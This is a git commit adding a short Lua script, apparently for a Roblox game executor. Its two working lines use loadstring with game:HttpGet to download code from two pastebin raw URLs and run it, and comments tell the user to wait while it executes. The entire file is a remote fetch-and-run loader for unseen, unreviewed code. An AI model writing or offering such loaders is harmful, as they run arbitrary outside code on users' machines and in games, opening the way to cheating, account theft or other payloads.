a8b579aba810c523fd8f05cce285a4d67ad016ed
LoopyPawss <101439821+LoopyPawss@users.noreply.github.com>
2022-06-14 07:16:58 -0600

    Create The Presentation Experience.lua

---
+++ The Presentation Experience.lua
@@ -0,0 +1,10 @@
+--> Greeting. Press F9 in-game to view.
+loadstring(game:HttpGet('https://pastebin.com/raw/9k2qX5d0'))()
+
+wait(5)
+
+-->// General Coding \\<--
+loadstring(game:HttpGet('https://pastebin.com/raw/LAjwPSN8'))()
+
+--> Please wait 5 seconds until the script is executed.
+--> This is not finished. Expect bugs while executing if this script is old.
